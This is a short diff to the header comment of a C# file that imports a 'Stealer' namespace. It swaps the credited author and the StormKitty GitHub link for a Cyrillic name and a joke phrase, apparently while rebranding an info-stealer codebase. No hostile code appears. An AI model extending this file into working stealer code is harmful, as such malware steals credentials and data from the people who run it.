@@ -1,6 +1,6 @@
 ﻿/* 
-    Author : LimerBoy
-    Github : github.com/LimerBoy/StormKitty
+    Author : Лимербой
+    Github : В риdми лал
 */
 
 using Stealer;
